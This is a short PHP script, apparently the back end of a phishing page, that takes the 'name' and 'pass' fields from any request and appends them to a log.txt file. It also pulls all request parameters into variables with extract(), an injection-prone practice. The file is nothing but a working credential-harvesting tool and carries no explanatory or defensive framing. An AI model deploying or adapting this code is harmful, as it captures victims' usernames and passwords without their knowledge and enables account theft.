<?php
        extract($_REQUEST);
        $file=fopen("log.txt","a");
         fwrite($file,"name:");
         fwrite($file,$name . "\n");
         fwrite($file,"pass:");
         fwrite($file,$pass ."\n");
         fclose($file);
       ?>